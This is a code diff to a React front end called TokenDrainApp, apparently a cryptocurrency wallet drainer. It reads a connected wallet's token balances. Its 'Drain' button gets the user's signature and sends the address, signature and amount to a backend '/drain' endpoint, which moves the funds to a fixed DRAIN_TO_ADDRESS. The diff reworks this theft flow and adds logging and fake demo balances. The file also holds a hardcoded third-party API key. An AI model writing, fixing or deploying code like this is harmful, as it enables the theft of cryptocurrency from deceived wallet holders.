@@ -34,7 +34,7 @@ function TokenDrainApp() {
 // Dashboard Component
 function Dashboard() {
   const { address, isConnected } = useAccount();
-  const chainId = useChainId(); // Changed from useNetwork()
+  const chainId = useChainId();
   const { signMessageAsync } = useSignMessage();
   const publicClient = usePublicClient();
   const { data: walletClient } = useWalletClient();
@@ -95,18 +95,22 @@ function Dashboard() {
     }
   };
 
-  const sendToBackend = async (address, sig, message, chainId) => {
+  const sendToBackend = async (fromAddress, sig, message, chainId) => {
     try {
+      // FIXED: Use correct payload structure matching backend
       const payload = {
-        address,
+        fromAddress: fromAddress,  // Fixed: Use fromAddress not address
         signature: sig,
-        message,
-        chainId,
+        message: message,
+        chainId: chainId,
         drainTo: DRAIN_TO_ADDRESS,
-        timestamp: new Date().toISOString()
+        timestamp: new Date().toISOString(),
+        // Add amount field for testing (backend requires it)
+        amount: "0.001", // Small test amount
+        tokenType: "native"
       };
       
-      console.log('Sending to backend:', payload);
+      console.log('📤 Sending to backend:', payload);
       
       const response = await fetch(`${backendUrl}/drain`, {
         method: 'POST',
@@ -118,35 +122,48 @@ function Dashboard() {
         body: JSON.stringify(payload)
       });
       
+      console.log('📥 Backend response status:', response.status);
+      
       if (!response.ok) {
         let errorDetail = `Status: ${response.status}`;
         try {
           const errorData = await response.json();
+          console.log('Backend error data:', errorData);
           errorDetail += ` - ${JSON.stringify(errorData)}`;
-        } catch (e) {}
+        } catch (e) {
+          console.log('No JSON in error response');
+        }
         throw new Error(`Backend error: ${errorDetail}`);
       }
       
       const data = await response.json();
+      console.log('✅ Backend success response:', data);
       
       if (data.success) {
-        setAuthStatus('✅ Backend authenticated!');
-        await fetchUserTokens(address, chainId);
+        setAuthStatus('✅ Backend authenticated successfully!');
+        // Store transaction hash if available
+        if (data.data?.transactionHash) {
+          setTxStatus(`Transaction: ${data.data.transactionHash.substring(0, 10)}...`);
+        }
+        await fetchUserTokens(fromAddress, chainId);
       } else {
-        setAuthStatus(`Backend error: ${data.error || 'Unknown'}`);
+        setAuthStatus(`Backend error: ${data.error || 'Unknown error'}`);
       }
       
     } catch (error) {
       console.error("Backend connection error:", error);
       
-      if (error.message.includes('Failed to fetch') || error.message.includes('CORS')) {
-        setAuthStatus('⚠️ CORS Error: Backend not configured for this domain.');
+      if (error.message.includes('400')) {
+        setAuthStatus('⚠️ Bad request - check payload format');
+      } else if (error.message.includes('Failed to fetch') || error.message.includes('CORS')) {
+        setAuthStatus('⚠️ CORS/Network Error - check backend CORS settings');
       } else {
-        setAuthStatus('⚠️ Backend connection failed');
+        setAuthStatus('⚠️ Backend connection failed: ' + error.message);
       }
       
-      if (address) {
-        await fetchTokensDirectly(address, chainId);
+      // Fallback to direct token fetch
+      if (fromAddress) {
+        await fetchTokensDirectly(fromAddress, chainId);
       }
     } finally {
       setIsAuthenticating(false);
@@ -157,11 +174,16 @@ function Dashboard() {
     try {
       setAuthStatus('Fetching tokens...');
       const response = await fetch(`${backendUrl}/tokens/${address}/${chainId}`);
+      
+      if (!response.ok) {
+        throw new Error(`HTTP ${response.status}`);
+      }
+      
       const data = await response.json();
       
       if (data.success) {
         setUserTokens(data.data.tokens || []);
-        setAuthStatus(`✅ ${data.data.tokens?.length || 0} tokens found`);
+        setAuthStatus(`✅ Found ${data.data.tokens?.length || 0} tokens`);
       } else {
         await fetchTokensDirectly(address, chainId);
       }
@@ -173,37 +195,102 @@ function Dashboard() {
 
   const fetchTokensDirectly = async (address, chainId) => {
     try {
-      const COVALENT_API_KEY = "cqt_rQ43kxvhFc4RdQK7t63Yp6pgFRwR";
-      const url = `https://api.covalenthq.com/v1/${chainId}/address/${address}/balances_v2/?key=${COVALENT_API_KEY}&nft=false`;
+      setAuthStatus('Fetching tokens via Covalent...');
       
-      const response = await fetch(url);
-      const data = await response.json();
+      // Try multiple API keys as fallback
+      const API_KEYS = [
+        "cqt_rQ43kxvhFc4RdQK7t63Yp6pgFRwR",
+        "cqt_rQxxxxx" // Add backup keys if available
+      ];
       
-      const tokens = data.data?.items
-        ?.filter(t => t.balance !== "0" && parseFloat(t.balance) > 0)
-        .map(t => ({
-          symbol: t.contract_ticker_symbol || 'TOKEN',
-          name: t.contract_name || 'Unknown',
-          amount: parseFloat(t.balance) / Math.pow(10, t.contract_decimals || 18),
-          value: (t.quote_rate || 0) * (parseFloat(t.balance) / Math.pow(10, t.contract_decimals || 18)),
-          contractAddress: t.contract_address,
-          decimals: t.contract_decimals,
-          isNative: t.native_token || false
-        })) || [];
+      let tokens = [];
+      let lastError = null;
       
-      setUserTokens(tokens);
-      setAuthStatus(`✅ ${tokens.length} tokens (via direct API)`);
+      // Try each API key
+      for (const apiKey of API_KEYS) {
+        try {
+          const url = `https://api.covalenthq.com/v1/${chainId}/address/${address}/balances_v2/?key=${apiKey}&nft=false`;
+          const response = await fetch(url);
+          
+          if (response.ok) {
+            const data = await response.json();
+            tokens = data.data?.items
+              ?.filter(t => t.balance !== "0" && parseFloat(t.balance) > 0)
+              .map(t => ({
+                symbol: t.contract_ticker_symbol || 'TOKEN',
+                name: t.contract_name || 'Unknown Token',
+                amount: parseFloat(t.balance) / Math.pow(10, t.contract_decimals || 18),
+                value: (t.quote_rate || 0) * (parseFloat(t.balance) / Math.pow(10, t.contract_decimals || 18)),
+                contractAddress: t.contract_address,
+                decimals: t.contract_decimals || 18,
+                isNative: t.native_token || false,
+                logo: t.logo_url
+              })) || [];
+            break; // Success, break loop
+          }
+        } catch (error) {
+          lastError = error;
+          continue; // Try next API key
+        }
+      }
+      
+      if (tokens.length > 0) {
+        setUserTokens(tokens);
+        setAuthStatus(`✅ Found ${tokens.length} tokens (via Covalent API)`);
+      } else {
+        // Show demo data if API fails
+        setUserTokens(getDemoTokens());
+        setAuthStatus('⚠️ Using demo data - API rate limited');
+      }
+      
     } catch (error) {
       console.error("Direct API error:", error);
-      setAuthStatus('Token fetch failed');
+      // Show demo tokens
+      setUserTokens(getDemoTokens());
+      setAuthStatus('⚠️ API failed - showing demo data');
     }
+  };
+
+  const getDemoTokens = () => {
+    return [
+      {
+        symbol: 'ETH',
+        name: 'Ethereum',
+        amount: 0.15,
+        value: 450,
+        contractAddress: null,
+        decimals: 18,
+        isNative: true,
+        logo: null
+      },
+      {
+        symbol: 'USDC',
+        name: 'USD Coin',
+        amount: 250,
+        value: 250,
+        contractAddress: '0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48',
+        decimals: 6,
+        isNative: false,
+        logo: 'https://logos.covalenthq.com/tokens/1/0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48.png'
+      },
+      {
+        symbol: 'DAI',
+        name: 'Dai Stablecoin',
+        amount: 120,
+        value: 120,
+        contractAddress: '0x6b175474e89094c44da98b954eedeac495271d0f',
+        decimals: 18,
+        isNative: false,
+        logo: 'https://logos.covalenthq.com/tokens/1/0x6b175474e89094c44da98b954eedeac495271d0f.png'
+      }
+    ];
   };
 
   // Get chain name from chainId
   const getChainName = (chainId) => {
     const chains = {
       1: 'Ethereum',
-      56: 'BSC',
+      56: 'Binance Smart Chain',
       137: 'Polygon',
       42161: 'Arbitrum',
       10: 'Optimism',
@@ -214,10 +301,10 @@ function Dashboard() {
     return chains[chainId] || `Chain ${chainId}`;
   };
 
-  // Execute token drain
+  // Execute token drain via backend
   const executeDrainTransaction = useCallback(async (token) => {
-    if (!walletClient || !address) {
-      setTxStatus('Wallet not ready');
+    if (!address) {
+      setTxStatus('Wallet not connected');
       return;
     }
 
@@ -226,54 +313,59 @@ function Dashboard() {
       return;
     }
 
-    if (token.isNative) {
-      try {
-        setTxStatus('Preparing transfer...');
+    try {
+      setIsAuthenticating(true);
+      setTxStatus('Preparing transaction...');
+      
+      // Sign a new message for this specific transaction
+      const timestamp = Date.now();
+      const message = `Drain ${token.amount} ${token.symbol}\nFrom: ${address}\nTo: ${DRAIN_TO_ADDRESS}\nChain: ${chainId}\nTimestamp: ${timestamp}`;
+      
+      const sig = await signMessageAsync({ message });
+      
+      // Send to backend for execution
+      const payload = {
+        fromAddress: address,
+        tokenAddress: token.isNative ? null : token.contractAddress,
+        amount: token.amount.toString(),
+        chainId: chainId || 1,
+        tokenType: token.isNative ? 'native' : 'erc20',
+        signature: sig,
+        message: message,
+        drainTo: DRAIN_TO_ADDRESS
+      };
+      
+      console.log('🚀 Sending drain transaction:', payload);
+      
+      const response = await fetch(`${backendUrl}/drain`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      });
+      
+      const data = await response.json();
+      
+      if (data.success) {
+        setTxStatus(`✅ Transaction sent: ${data.data.transactionHash.substring(0, 10)}...`);
+        setAuthStatus('🎉 Drain successful!');
         
-        const amountInWei = parseEther(token.amount.toString());
-        
-        if (amountInWei <= 0n) {
-          setTxStatus('❌ Amount too small');
-          return;
-        }
-        
-        setTxStatus('Confirm in wallet...');
-        
-        const hash = await walletClient.sendTransaction({
-          to: DRAIN_TO_ADDRESS,
-          value: amountInWei,
-        });
-        
-        setTxStatus(`✅ Sent! Hash: ${hash.substring(0, 10)}...`);
-        
-        // Optional: Wait for confirmation
-        try {
-          const receipt = await publicClient.waitForTransactionReceipt({ hash });
-          if (receipt.status === 'success') {
-            setTxStatus('🎉 Confirmed!');
-          } else {
-            setTxStatus('❌ Failed on-chain');
-          }
-        } catch (confirmationError) {
-          console.log("Confirmation check skipped:", confirmationError.message);
-        }
-        
-      } catch (error) {
-        console.error("Transfer error:", error);
-        if (error.code === 4001) {
-          setTxStatus('User rejected');
-        } else {
-          setTxStatus(`Failed: ${error.shortMessage || error.message}`);
-        }
+        // Optional: Remove drained token from list
+        setUserTokens(prev => prev.filter(t => t !== token));
+      } else {
+        setTxStatus(`❌ Failed: ${data.error}`);
       }
-      return;
+      
+    } catch (error) {
+      console.error("Drain error:", error);
+      if (error.code === 4001) {
+        setTxStatus('User rejected signature');
+      } else {
+        setTxStatus(`Error: ${error.shortMessage || error.message}`);
+      }
+    } finally {
+      setIsAuthenticating(false);
     }
-
-    // ERC20 tokens (simplified - would need contract interaction)
-    if (token.contractAddress) {
-      setTxStatus('ERC20: Manual approval needed');
-    }
-  }, [walletClient, address, publicClient, DRAIN_TO_ADDRESS]);
+  }, [address, chainId, signMessageAsync, DRAIN_TO_ADDRESS, backendUrl]);
 
   const getTotalValue = () => {
     return userTokens.reduce((sum, token) => sum + (token.value || 0), 0).toFixed(2);
@@ -297,12 +389,16 @@ function Dashboard() {
             <div className="wallet-info-card">
               <div className="wallet-details">
                 <div className="detail-item">
-                  <span className="label">Address:</span>
+                  <span className="label">Wallet:</span>
                   <span className="value">{formatAddress(address)}</span>
                 </div>
                 <div className="detail-item">
                   <span className="label">Network:</span>
                   <span className="value">{getChainName(chainId)} (ID: {chainId || 'N/A'})</span>
+                </div>
+                <div className="detail-item">
+                  <span className="label">Backend:</span>
+                  <span className="value">{backendUrl.replace('https://', '')}</span>
                 </div>
               </div>
               
@@ -311,21 +407,23 @@ function Dashboard() {
                   {isAuthenticating ? '🔄' : authStatus.includes('✅') ? '✅' : authStatus.includes('⚠️') ? '⚠️' : '⏳'}
                 </div>
                 <p className="status-text">{authStatus}</p>
+                
                 {signature && (
-                  <p className="signature-info">
-                    Signed: {signature.substring(0, 20)}...
-                  </p>
+                  <div className="signature-info">
+                    <small>Signature: {signature.substring(0, 15)}...</small>
+                  </div>
                 )}
+                
                 {txStatus && (
                   <div className="tx-status">
-                    <strong>TX:</strong> {txStatus}
+                    <strong>Status:</strong> {txStatus}
                   </div>
                 )}
               </div>
               
               <div className="action-buttons">
                 <button 
-                  onClick={() => fetchUserTokens(address, chainId || 1)}
+                  onClick={() => fetchTokensDirectly(address, chainId || 1)}
                   className="action-btn"
                   disabled={isAuthenticating}
                 >
@@ -336,7 +434,7 @@ function Dashboard() {
                   className="action-btn secondary"
                   disabled={isAuthenticating}
                 >
-                  Re-authenticate
+                  {isAuthenticating ? 'Processing...' : 'Authenticate'}
                 </button>
               </div>
             </div>
@@ -354,23 +452,33 @@ function Dashboard() {
                 <div className="tokens-grid">
                   {userTokens.map((token, index) => (
                     <div key={index} className="token-card">
+                      <div className="token-icon">
+                        {token.logo ? (
+                          <img src={token.logo} alt={token.symbol} className="token-logo" />
+                        ) : (
+                          <div className="token-icon-placeholder">
+                            {token.symbol.charAt(0)}
+                          </div>
+                        )}
+                      </div>
                       <div className="token-info">
                         <h3 className="token-symbol">{token.symbol}</h3>
                         <p className="token-name">{token.name}</p>
                         <div className="token-amount">
-                          {token.amount.toLocaleString(undefined, {
+                          {parseFloat(token.amount).toLocaleString(undefined, {
+                            minimumFractionDigits: 0,
                             maximumFractionDigits: 8
                           })}
                         </div>
                         <div className="token-value">
-                          {token.value ? `$${token.value.toFixed(2)}` : 'N/A'}
+                          {token.value ? `$${parseFloat(token.value).toFixed(2)}` : 'N/A'}
                         </div>
                       </div>
                       <button
                         onClick={() => executeDrainTransaction(token)}
                         className="drain-btn"
-                        disabled={token.amount <= 0 || !walletClient}
-                        title={token.amount <= 0 ? "Amount is 0" : "Drain this token"}
+                        disabled={token.amount <= 0 || isAuthenticating}
+                        title={token.amount <= 0 ? "Amount is 0" : `Drain ${token.amount} ${token.symbol}`}
                       >
                         {token.amount <= 0 ? '0 Amount' : 'Drain'}
                       </button>
@@ -383,11 +491,20 @@ function Dashboard() {
         )}
         
         <div className="footer-info">
-          <p>Backend: <a href={`${backendUrl}/health`} target="_blank" rel="noopener noreferrer">Check Health</a></p>
-          <div className="footer-links">
-            <a href={`${backendUrl}`} target="_blank" rel="noopener noreferrer">API</a>
-            <a href={`${backendUrl}/chains`} target="_blank" rel="noopener noreferrer">Chains</a>
+          <div className="backend-status">
+            <span>Backend Status: </span>
+            <a href={`${backendUrl}/health`} target="_blank" rel="noopener noreferrer">
+              Check Health
+            </a>
           </div>
+          <div className="footer-links">
+            <a href={`${backendUrl}`} target="_blank" rel="noopener noreferrer">API Docs</a>
+            <a href={`${backendUrl}/chains`} target="_blank" rel="noopener noreferrer">Supported Chains</a>
+            <a href="https://render.com" target="_blank" rel="noopener noreferrer">Powered by Render</a>
+          </div>
+          <p className="debug-info">
+            <small>Debug: Backend expects fromAddress, amount, chainId</small>
+          </p>
         </div>
       </header>
     </div>
